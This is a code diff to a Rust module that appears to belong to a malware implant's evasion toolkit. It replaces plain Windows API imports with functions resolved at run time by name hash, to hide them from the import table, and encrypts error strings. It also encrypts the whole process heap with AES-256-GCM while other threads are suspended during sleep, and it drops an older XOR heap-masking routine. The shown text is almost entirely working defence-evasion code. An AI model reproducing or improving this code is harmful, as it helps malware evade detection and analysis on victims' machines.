@@ -2,8 +2,7 @@
 //
 // Process-heap protection during sleep:
 //   - Thread suspension / resumption around heap operations
-//   - XOR-based heap encryption (legacy, 16-byte repeating key)
-//   - AES-256-GCM stream-cipher heap encryption (upgrade, same-length output)
+//   - AES-256-GCM stream-cipher heap encryption (same-length output)
 //
 // CRITICAL: The process heap is shared across ALL threads. If any thread
 // accesses the heap while it is encrypted the process will access-violate.
@@ -15,24 +14,95 @@
 
 // ── Thread Suspension ──────────────────────────────────────────────────
 
-#[cfg(target_os = "windows")]
+// aes_str! expands against the strcrypt_rt runtime, so both imports are
+// needed on every OS (the non-Windows stubs also return encrypted strings).
 use crate::strcrypt_rt;
-#[cfg(target_os = "windows")]
+#[allow(unused_imports)]
 use strcrypt::aes_str;
 #[cfg(target_os = "windows")]
 pub fn suspend_other_threads() -> Vec<*mut std::ffi::c_void> {
     use std::ffi::c_void;
     use std::mem;
 
-    extern "system" {
-        fn GetCurrentProcessId() -> u32;
-        fn GetCurrentThreadId() -> u32;
-        fn CreateToolhelp32Snapshot(flags: u32, pid: u32) -> *mut c_void;
-        fn Thread32First(snap: *mut c_void, entry: *mut ThreadEntry32) -> i32;
-        fn Thread32Next(snap: *mut c_void, entry: *mut ThreadEntry32) -> i32;
-        fn OpenThread(access: u32, inherit: i32, tid: u32) -> *mut c_void;
-        fn SuspendThread(thread: *mut c_void) -> u32;
-        fn CloseHandle(h: *mut c_void) -> i32;
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetCurrentProcessId() -> u32 {
+        type F = unsafe extern "system" fn() -> u32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetCurrentProcessId")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f() }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetCurrentThreadId() -> u32 {
+        type F = unsafe extern "system" fn() -> u32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetCurrentThreadId")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f() }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CreateToolhelp32Snapshot(flags: u32, pid: u32) -> *mut c_void {
+        type F = unsafe extern "system" fn(u32, u32) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateToolhelp32Snapshot")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(flags, pid) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn Thread32First(snap: *mut c_void, entry: *mut ThreadEntry32) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, *mut ThreadEntry32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"Thread32First")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(snap, entry) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn Thread32Next(snap: *mut c_void, entry: *mut ThreadEntry32) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, *mut ThreadEntry32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"Thread32Next")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(snap, entry) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn OpenThread(access: u32, inherit: i32, tid: u32) -> *mut c_void {
+        type F = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"OpenThread")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(access, inherit, tid) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn SuspendThread(thread: *mut c_void) -> u32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> u32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"SuspendThread")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(thread) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CloseHandle(h: *mut c_void) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CloseHandle")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(h) }
     }
 
     #[repr(C)]
@@ -81,9 +151,25 @@ pub fn suspend_other_threads() -> Vec<*mut std::ffi::c_void> {
 #[cfg(target_os = "windows")]
 pub fn resume_threads(handles: Vec<*mut std::ffi::c_void>) {
     use std::ffi::c_void;
-    extern "system" {
-        fn ResumeThread(thread: *mut c_void) -> u32;
-        fn CloseHandle(h: *mut c_void) -> i32;
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn ResumeThread(thread: *mut c_void) -> u32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> u32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ResumeThread")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(thread) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CloseHandle(h: *mut c_void) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CloseHandle")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(h) }
     }
     unsafe {
         for h in handles {
@@ -135,64 +221,6 @@ struct ProcessHeapEntry {
     _union:       [u8; 24],
 }
 
-// ── XOR Heap Encryption (legacy) ──────────────────────────────────────
-// Walks the process heap via HeapWalk and XORs every live block with a
-// repeating 16-byte key. Self-inverse: calling with the same key
-// restores the original content.
-//
-// Prefer encrypt_heap_aes256gcm for new deployments - the XOR key is
-// short and the operation is detectable by comparing heap bytes against
-// a repeating pattern. The AES variant is kept for backward compat
-// with existing operator playbooks that reference evasion:encrypt_heap.
-
-#[cfg(target_os = "windows")]
-pub fn encrypt_heap(xor_key: &[u8; 16]) -> Result<usize, String> {
-    use std::ffi::c_void;
-
-    extern "system" {
-        fn GetProcessHeap() -> *mut c_void;
-        fn HeapLock(heap: *mut c_void) -> i32;
-        fn HeapUnlock(heap: *mut c_void) -> i32;
-        fn HeapWalk(heap: *mut c_void, entry: *mut ProcessHeapEntry) -> i32;
-    }
-
-    // OS-fixed (winnt.h) flag, not mirrored by the typed FFI config.
-    const PROCESS_HEAP_ENTRY_BUSY: u16 = 0x4;
-
-    unsafe {
-        let heap = GetProcessHeap();
-        if heap.is_null() { return Err(aes_str!("GetProcessHeap failed")); }
-        if HeapLock(heap) == 0 { return Err(aes_str!("HeapLock failed")); }
-
-        let mut entry: ProcessHeapEntry = std::mem::zeroed();
-        let mut encrypted_blocks = 0usize;
-
-        while HeapWalk(heap, &mut entry) != 0 {
-            if entry.flags & PROCESS_HEAP_ENTRY_BUSY != 0
-                && entry.size >= 16
-                && !entry.data.is_null()
-            {
-                let block = std::slice::from_raw_parts_mut(entry.data as *mut u8, entry.size as usize);
-                for (i, byte) in block.iter_mut().enumerate() {
-                    *byte ^= xor_key[i % 16];
-                }
-                encrypted_blocks += 1;
-            }
-        }
-
-        HeapUnlock(heap);
-        Ok(encrypted_blocks)
-    }
-}
-
-#[cfg(not(target_os = "windows"))]
-pub fn encrypt_heap(_xor_key: &[u8; 16]) -> Result<usize, String> { Ok(0) }
-
-/// XOR is its own inverse - decrypt by calling encrypt with the same key.
-pub fn decrypt_heap(xor_key: &[u8; 16]) -> Result<usize, String> {
-    encrypt_heap(xor_key)
-}
-
 // ── AES-256-GCM Heap Encryption ───────────────────────────────────────
 // Replaces the 16-byte repeating-XOR with AES-256-GCM in CTR stream mode.
 // The GCM authentication tag is discarded; ciphertext length == plaintext
@@ -215,11 +243,45 @@ pub fn encrypt_heap_aes256gcm(key: &[u8; 32], base_nonce: &[u8; 12]) -> Result<u
     use aes_gcm::{aead::AeadInPlace, Aes256Gcm, KeyInit, Nonce};
     use std::ffi::c_void;
 
-    extern "system" {
-        fn GetProcessHeap() -> *mut c_void;
-        fn HeapLock(heap: *mut c_void) -> i32;
-        fn HeapUnlock(heap: *mut c_void) -> i32;
-        fn HeapWalk(heap: *mut c_void, entry: *mut ProcessHeapEntry) -> i32;
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetProcessHeap() -> *mut c_void {
+        type F = unsafe extern "system" fn() -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetProcessHeap")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f() }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn HeapLock(heap: *mut c_void) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"HeapLock")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(heap) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn HeapUnlock(heap: *mut c_void) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"HeapUnlock")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(heap) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn HeapWalk(heap: *mut c_void, entry: *mut ProcessHeapEntry) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, *mut ProcessHeapEntry) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"HeapWalk")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(heap, entry) }
     }
 
     // OS-fixed (winnt.h) flag, not mirrored by the typed FFI config.
@@ -268,11 +330,19 @@ pub fn decrypt_heap_aes256gcm(key: &[u8; 32], base_nonce: &[u8; 12]) -> Result<u
     encrypt_heap_aes256gcm(key, base_nonce)
 }
 
+// Heap walking uses the Win32 process-heap API; there is no portable
+// equivalent. Returning Ok(0) here made the handler report "0 blocks
+// encrypted" with a success exit code, so fail loudly instead (same
+// convention as patching.rs).
 #[cfg(not(target_os = "windows"))]
-pub fn encrypt_heap_aes256gcm(_key: &[u8; 32], _base_nonce: &[u8; 12]) -> Result<usize, String> { Ok(0) }
+pub fn encrypt_heap_aes256gcm(_key: &[u8; 32], _base_nonce: &[u8; 12]) -> Result<usize, String> {
+    Err(strcrypt::aes_str!("Heap encryption is Windows-only"))
+}
 
 #[cfg(not(target_os = "windows"))]
-pub fn decrypt_heap_aes256gcm(_key: &[u8; 32], _base_nonce: &[u8; 12]) -> Result<usize, String> { Ok(0) }
+pub fn decrypt_heap_aes256gcm(_key: &[u8; 32], _base_nonce: &[u8; 12]) -> Result<usize, String> {
+    Err(strcrypt::aes_str!("Heap decryption is Windows-only"))
+}
 
 #[cfg(test)]
 mod tests {
@@ -327,93 +397,21 @@ mod tests {
         resume_threads(Vec::new()); // should be a no-op
     }
 
+    // The AES stubs must fail loudly: Ok(0) used to surface as
+    // "0 blocks encrypted" with a success exit code, implying masking
+    // happened when nothing did. The handler turns Err into exit 1.
     #[cfg(not(target_os = "windows"))]
     #[test]
-    fn encrypt_heap_xor_returns_zero_blocks_on_non_windows() {
-        assert_eq!(encrypt_heap(&[0u8; 16]).unwrap(), 0);
-    }
-
-    #[cfg(not(target_os = "windows"))]
-    #[test]
-    fn decrypt_heap_xor_returns_zero_blocks_on_non_windows() {
-        assert_eq!(decrypt_heap(&[0u8; 16]).unwrap(), 0);
-    }
-
-    #[cfg(not(target_os = "windows"))]
-    #[test]
-    fn encrypt_heap_aes_returns_zero_blocks_on_non_windows() {
-        assert_eq!(encrypt_heap_aes256gcm(&[0u8; 32], &[0u8; 12]).unwrap(), 0);
+    fn encrypt_heap_aes_errors_on_non_windows() {
+        let r = encrypt_heap_aes256gcm(&[0u8; 32], &[0u8; 12]);
+        assert!(r.is_err(), "stub must not report success on non-Windows");
     }
 
     #[cfg(not(target_os = "windows"))]
     #[test]
-    fn decrypt_heap_aes_returns_zero_blocks_on_non_windows() {
-        assert_eq!(decrypt_heap_aes256gcm(&[0u8; 32], &[0u8; 12]).unwrap(), 0);
-    }
-
-    // ── XOR cipher properties ─────────────────────────────────────────────
-    //
-    // encrypt_heap() operates on the live process heap via HeapLock +
-    // HeapWalk. Calling it directly in a test would encrypt the test
-    // framework's own heap allocations, crash the runner, or deadlock.
-    //
-    // Instead these tests exercise the same XOR logic on isolated stack
-    // buffers, verifying the mathematical properties that the heap
-    // function relies on.
-
-    fn xor_buf(buf: &mut [u8], key: &[u8; 16]) {
-        for (i, b) in buf.iter_mut().enumerate() { *b ^= key[i % 16]; }
-    }
-
-    #[test]
-    fn xor_is_self_inverse() {
-        let key = [0xAB_u8; 16];
-        let original = *b"evasion xor test";
-        let mut buf = original;
-        xor_buf(&mut buf, &key);
-        assert_ne!(buf, original, "XOR must change the bytes");
-        xor_buf(&mut buf, &key);
-        assert_eq!(buf, original, "second XOR must restore original");
-    }
-
-    #[test]
-    fn xor_zero_key_is_identity() {
-        let key = [0u8; 16];
-        let original = [0xCC_u8; 16];
-        let mut buf = original;
-        xor_buf(&mut buf, &key);
-        assert_eq!(buf, original);
-    }
-
-    #[test]
-    fn xor_all_ones_key_flips_every_bit() {
-        let key = [0xFF_u8; 16];
-        let mut buf = [0x00_u8; 16];
-        xor_buf(&mut buf, &key);
-        assert_eq!(buf, [0xFF_u8; 16]);
-    }
-
-    #[test]
-    fn xor_different_keys_produce_different_outputs() {
-        let plaintext = [0x55_u8; 16];
-        let mut a = plaintext;
-        let mut b = plaintext;
-        xor_buf(&mut a, &[0x11_u8; 16]);
-        xor_buf(&mut b, &[0x22_u8; 16]);
-        assert_ne!(a, b);
-    }
-
-    #[test]
-    fn xor_repeating_key_pattern_applies_modularly() {
-        // With a 16-byte key and a 32-byte buffer the second 16 bytes get
-        // the same keystream as the first - XOR is independently verifiable.
-        let key: [u8; 16] = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15];
-        let mut buf = [0u8; 32];
-        xor_buf(&mut buf, &key);
-        // Byte at offset 0 and offset 16 should both equal key[0] = 0 XOR 0 = 0.
-        assert_eq!(buf[0], buf[16]);
-        // Byte at offset 1 and offset 17 should both equal key[1] = 1.
-        assert_eq!(buf[1], buf[17]);
+    fn decrypt_heap_aes_errors_on_non_windows() {
+        let r = decrypt_heap_aes256gcm(&[0u8; 32], &[0u8; 12]);
+        assert!(r.is_err(), "stub must not report success on non-Windows");
     }
 
     // ── AES-256-GCM stream cipher properties ──────────────────────────────
